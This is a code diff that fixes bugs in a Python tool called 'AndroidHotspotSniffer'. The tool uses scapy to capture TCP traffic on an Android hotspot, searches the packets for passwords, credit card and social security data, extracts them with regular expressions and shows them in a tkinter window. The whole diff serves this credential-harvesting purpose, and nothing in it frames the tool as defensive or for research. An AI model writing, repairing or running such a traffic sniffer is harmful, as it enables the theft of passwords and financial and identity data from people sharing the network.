@@ -1,6 +1,8 @@
 import wifi
 from scapy.all import *
 import os
+import re
+import tkinter as tk
 
 class AndroidHotspotSniffer:
     def __init__(self):
@@ -18,32 +20,31 @@ class AndroidHotspotSniffer:
             print(f"Error connecting: {e}")
 
     def sniff_data(self, iface):
-        global sniffing
         self.sniffing = True
-        sniffer = Sniff(iface=iface, prn=self.process_packet)
+        sniff(iface=iface, prn=self.process_packet)
 
     def process_packet(self, packet):
         try:
             if packet.haslayer(TCP):
-
                 # Get the source and destination IP addresses
                 src_ip = packet[IP].src
                 dst_ip = packet[IP].dst
 
                 # Check if the packet is from or to the Android device
                 if src_ip == "192.168.43.1" or dst_ip == "192.168.43.1":
-
                     # Get the payload of the packet
-                    payload = packet[TCP].payload
+                    payload = bytes(packet[TCP].payload)
 
                     # Check if the payload contains sensitive data
                     if b'password' in payload or b'credit card' in payload or b'social security' in payload:
-
                         # Extract the sensitive data from the payload
-                        extracted_data = re.findall(b'password=(.*)', payload).decode() or re.findall(b'credit card=(.*)', payload).>
+                        extracted_data = re.findall(b'password=(.*)', payload) or re.findall(b'credit card=(.*)', payload)
 
                         # Print the sensitive data
-                        print(extracted_data)
+                        for data in extracted_data:
+                            decoded_data = data.decode()
+                            print(decoded_data)
+                            self.sensitive_data.insert(tk.END, f"{decoded_data}\n")
         except Exception as e:
             print(f"Error processing packet: {e}")
 
@@ -52,11 +53,13 @@ class AndroidHotspotSniffer:
         self.window.title("Android Hotspot Sniffer")
 
         # Create a text box to enter the SSID of the Android hotspot
+        tk.Label(self.window, text="SSID:").pack()
         self.ssid_entry = tk.Entry(self.window)
         self.ssid_entry.pack()
 
         # Create a text box to enter the password of the Android hotspot
-        self.password_entry = tk.Entry(self.window)
+        tk.Label(self.window, text="Password:").pack()
+        self.password_entry = tk.Entry(self.window, show="*")
         self.password_entry.pack()
 
         # Create a text box to display the sensitive data that is extracted from the sniffed packets
@@ -68,7 +71,7 @@ class AndroidHotspotSniffer:
         self.connect_button.pack()
 
         # Create a button to start sniffing data
-        self.start_sniffing_button = tk.Button(self.window, text="Start Sniffing", command=lambda: self.sniff_data(os.popen("ip link show | grep wlan0 | awk '{print $2}'").read().strip()))
+        self.start_sniffing_button = tk.Button(self.window, text="Start Sniffing", command=lambda: self.sniff_data("wlan0"))
         self.start_sniffing_button.pack()
 
         self.window.mainloop()
